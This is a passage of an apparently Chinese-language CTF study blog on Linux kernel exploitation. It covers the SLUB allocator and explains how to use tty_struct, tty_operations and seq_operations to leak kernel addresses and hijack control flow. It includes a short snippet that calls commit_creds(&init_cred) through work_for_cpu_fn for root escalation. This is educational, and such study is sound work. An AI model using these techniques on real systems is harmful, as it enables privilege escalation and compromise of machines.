href="#kmem-cache-结构体" class="headerlink" title="kmem_cache 结构体"></a>kmem_cache 结构体</h5><ul><li>所有 <code>kmem_cache</code> 构成双向链表，且有一个全局数组 <code>kmalloc_caches</code> 存放通用 <code>kmem_cache</code>，大小为 <code>2</code>的幂次方，在分配时，其会选择一个大于其大小的 <code>2</code>的幂次方的值。（此外，为了减少内存碎片，还有一些特殊大小的 <code>slub</code>，例如 <code>96</code>字节和 <code>192</code>字节。）</li><li>其中关键成员包括：<ul><li><code>cpu_slab</code>：<code>struct kmem_cache_cpu __percpu *</code> 类型，指向当前 <code>CPU</code> 独占的内存池（同一个 <code>CPU</code> 访问自己的内存池不用上锁，优先从中分配、释放，效率高，通过 <code>gs</code>寄存器作为 <code>percpu</code>基址进行寻址，做题时先绑定 <code>CPU</code>）</li><li><code>node</code>：<code>struct kmem_cache_node *[]</code> 类型，存放多个不同 <code>node</code> 的后备内存池</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  84 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="comment">/*  85 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="comment">/*  86 */</span> <span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="comment">/*  87 */</span> <span class="type">slab_flags_t</span> flags;</span><br><span class="line"><span class="comment">/*  88 */</span> <span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line"><span class="comment">/*  89 */</span> <span class="type">unsigned</span> <span class="type">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="comment">/*  90 */</span> <span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="comment">/*  91 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line"><span class="comment">/*  92 */</span> <span class="type">unsigned</span> <span class="type">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="comment">/*  93 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/*  94 */</span> <span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="comment">/*  95 */</span> <span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line"><span class="comment">/*  96 */</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 136 */</span> &#125;;</span><br></pre></td></tr></table></figure><p><img src="/image/learning_linux_kernel_2/1740888683949.png" alt="1740888683949">*</p><h5 id="kmem-cache-cpu-结构体"><a href="#kmem-cache-cpu-结构体" class="headerlink" title="kmem_cache_cpu 结构体"></a>kmem_cache_cpu 结构体</h5><ul><li>对于一个 <code>kmem_cache</code>，每个 <code>CPU</code> 都有与其对应且独立的 <code>kmem_cache_cpu</code></li><li>其中关键成员包括：<ul><li><code>freelist</code>：指向下一个可用对象（<code>object</code>）的指针，其 <code>freelist</code>与slab中的 <code>freelist</code>不同（仅当 <code>slab</code> 对象被挂在 <code>partial</code> 链表中时，其 <code>freelist</code> 才有可能被用到；分配和释放优先考虑 <code>kmem_cache_cpu</code>中的 <code>freelist</code>）</li><li><code>slab</code>：指向当前用以进行内存分配的 <code>slab</code></li><li><code>partial</code>：需要开启编译选项 <code>CONFIG_SLUB_CPU_PARTIAL=y</code>，<code>percpu</code> 的 <code>partial slab</code> 链表，链表上为仍有一定空闲对象的 <code>slab</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; include/linux/slub_def.h:43</span></span><br><span class="line"><span class="comment">/* 43 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="comment">/* 44 */</span> <span class="type">void</span> **freelist;<span class="comment">/* Pointer to next available object */</span></span><br><span class="line"><span class="comment">/* 45 */</span> <span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line"><span class="comment">/* 46 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="comment">/* 47 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* 48 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="comment">/* 49 */</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">-------</span><br><span class="line"><span class="comment">/* 53 */</span> &#125;;</span><br></pre></td></tr></table></figure><h5 id="kmem-cache-node-结构体"><a href="#kmem-cache-node-结构体" class="headerlink" title="kmem_cache_node 结构体"></a>kmem_cache_node 结构体</h5><ul><li>每个节点（即三级结构 <code>节点 -&gt; 区 -&gt; 页</code> 中的节点）对应的后备内存池，当 percpu 的独占内存池耗尽后便会从对应 node 的后备内存池尝试分配</li><li>不同于 <code>kmem_cache_cpu</code> 只有一个 <code>slab</code>，<code>kmem_cache_node</code> 会维护多个 <code>slab</code>，对 <code>kmem_cache_cpu</code> 的 <code>slab</code> 进行分配和回收</li><li>其中关键成员包括：<ul><li><code>partial</code>：同上，包含 <code>partial slab</code></li><li><code>full</code>：不常用，连接没有空闲对象的 <code>slab</code></li></ul></li></ul><h4 id="分配过程"><a href="#分配过程" class="headerlink" title="分配过程"></a>分配过程</h4><ol><li><code>slub allocator</code>从 <code>kmem_cache_cpu</code>上取 <code>object</code>，若 <code>kmem_cache_cpu</code>上存在，则直接返回；</li><li>若不存在，该 <code>slub</code>会被加入到 <code>kmem_cache_node</code>中的 <code>full</code>链表，并从 <code>partial</code>链表中取一个 <code>slub</code>挂载到 <code>kmem_cache_cpu</code>上，然后重复第一步的操作</li><li>若 <code>kmem_cache_cpu</code>的 <code>partial</code>链表也空了，那么会向 <code>buddy system</code>请求分配新的内存页，划分为多个 <code>object</code>，并给到 <code>kmem_cache_cpu</code>，取出 <code>object</code>并返回</li></ol><h4 id="释放过程"><a href="#释放过程" class="headerlink" title="释放过程"></a>释放过程</h4><p>关键于被释放的 <code>object</code>所属的slub位于哪里。</p><p>若其 <code>slub</code>现在位于 <code>kmem_cache_cpu</code>，则直接头插法插入当前 <code>kmem_cache_cpu</code>的 <code>freelist</code>链表。</p><p>若其 <code>slub</code>属于 <code>kmem_cache_node</code>的 <code>partial</code>链表上的 <code>slub</code>，则同样通过头插法插入对应的 <code>slub</code>中的 <code>freelist</code>。</p><p>若其 <code>slub</code>属于 <code>kmem_cache_node</code>的 <code>full</code>链表上的 <code>slub</code>，则会使其成为对应 <code>slub</code>的 <code>freelist</code>的头结点，并将该 <code>slub</code>从 <code>full</code>链表迁移到 <code>partial</code></p><h2 id="常用结构体、函数及利用方法"><a href="#常用结构体、函数及利用方法" class="headerlink" title="常用结构体、函数及利用方法"></a>常用结构体、函数及利用方法</h2><h3 id="tty-设备结构体"><a href="#tty-设备结构体" class="headerlink" title="tty 设备结构体"></a>tty 设备结构体</h3><p>tty 设备在 <code>/dev</code> 下的一个伪终端设备 <code>ptmx</code> 。</p><h4 id="tty-struct（kmalloc-1k-GFP-KERNEL-ACCOUNT）"><a href="#tty-struct（kmalloc-1k-GFP-KERNEL-ACCOUNT）" class="headerlink" title="tty_struct（kmalloc-1k | GFP_KERNEL_ACCOUNT）"></a>tty_struct（kmalloc-1k | GFP_KERNEL_ACCOUNT）</h4><h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>定义于 <code>include/linux/tty.h</code> 中，当我们打开 <code>/dev/ptmx</code> 时（init文件需要挂载 <code>pts</code>）会在内核中分配一个 tty_struct 结构体，起始位置有魔数为 <code>0x5401</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure><h5 id="泄露内核基地址（-text段）"><a href="#泄露内核基地址（-text段）" class="headerlink" title="泄露内核基地址（.text段）"></a>泄露内核基地址（.text段）</h5><p><code>tty_operations</code>会被初始化为全局变量 <code>ptm_unix98_ops</code>或者 <code>pyt_unix98_ops</code> ，开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 <code>tty_operations</code> 地址的低三16进制位来判断是 <code>ptm_unix98_ops</code> 还是 <code>pty_unix98_ops</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep <span class="string">&#x27;ptm_unix98_ops&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="泄露内核堆地址（内核线性映射区）"><a href="#泄露内核堆地址（内核线性映射区）" class="headerlink" title="泄露内核堆地址（内核线性映射区）"></a>泄露内核堆地址（内核线性映射区）</h5><p><code>tty_struct</code>中的 <code>dev</code>与 <code>driver</code>是通过 <code>kmalloc</code>分配的，可以通过这两个成员泄露内核地址。</p><h5 id="劫持内核执行流"><a href="#劫持内核执行流" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h5><p>对这个 <code>tty</code>设备（例如 <code>/dev/ptmx</code>）进行相应操作（如 <code>write</code>、<code>ioctl</code>）时便会执行我们在 <code>tty_operations</code>中布置好的恶意函数指针，从而劫持内核执行流。参数可控， <code>rdi</code>即为 <code>tty_struct</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,<span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,<span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,<span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h4 id="work-for-cpu-fn函数"><a href="#work-for-cpu-fn函数" class="headerlink" title="work_for_cpu_fn函数"></a>work_for_cpu_fn函数</h4><h5 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"> </span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*相当于执行</span></span><br><span class="line"><span class="comment">static void work_for_cpu_fn(size_t * args)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    args[6] = ((size_t (*) (size_t)) (args[4](args[5]));</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>可以将 <code>tty_struct</code>劫持为如下形式：（劫持函数表 <code>tty_operations</code>中的 <code>ioctl</code> 为work_for_cpu_fn）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tty_struct[<span class="number">4</span>] = (<span class="type">size_t</span>)commit_creds;</span><br><span class="line">tty_struct[<span class="number">5</span>] = (<span class="type">size_t</span>)init_cred;</span><br><span class="line"></span><br><span class="line">ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"><span class="comment">/*相当于执行</span></span><br><span class="line"><span class="comment">((void*)tty_struct[4])(tty_struct[5]);</span></span><br><span class="line"><span class="comment">commit_creds(&amp;init_cred);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="tty-file-private-kmalloc-32-GFP-KERNEL"><a href="#tty-file-private-kmalloc-32-GFP-KERNEL" class="headerlink" title="tty_file_private (kmalloc-32 | GFP_KERNEL)"></a>tty_file_private (kmalloc-32 | GFP_KERNEL)</h4><h5 id="定义：-2"><a href="#定义：-2" class="headerlink" title="定义："></a>定义：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct tty_file_private &#123;</span><br><span class="line">    struct tty_struct *tty;</span><br><span class="line">    struct file *file;</span><br><span class="line">    struct list_head list;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>打开 <code>/dev/ptmx</code> 时会分配 <code>tty_file_private</code> 并且该结构体的 <code>tty</code> 指针会指向 <code>tty_struct</code> 。（UAF用于泄露地址）</p><p>相应的，当关闭打开的 <code>/dev/ptmx</code> 时会释放相应结构。</p><h3 id="seq-file-相关"><a href="#seq-file-相关" class="headerlink" title="seq_file 相关"></a>seq_file 相关</h3><h4 id="seq-operation-kmalloc-32-GFP-KERNEL-ACCOUNT"><a href="#seq-operation-kmalloc-32-GFP-KERNEL-ACCOUNT" class="headerlink" title="seq_operation(kmalloc-32 | GFP_KERNEL_ACCOUNT)"></a>seq_operation(kmalloc-32 | GFP_KERNEL_ACCOUNT)</h4><h5 id="定义：-3"><a href="#定义：-3" class="headerlink" title="定义："></a>定义：</h5><ul><li><p>为了简化操作，在内核 <code>seq_file</code> 系列接口中为 <code>file</code> 结构体提供了 <code>private data</code> 成员 <code>seq_file</code> 结构体(无法打开来申请内存空间)。</p></li><li><p>通过 <code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>来打开，从而申请 <code>seq_operation</code>这个结构体。</p><ul><li><pre><code class="language-c">stat_open()        &lt;--- stat_proc_ops.proc_open    single_open_size()        single_open() //可以分配seq_operations 结构体<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 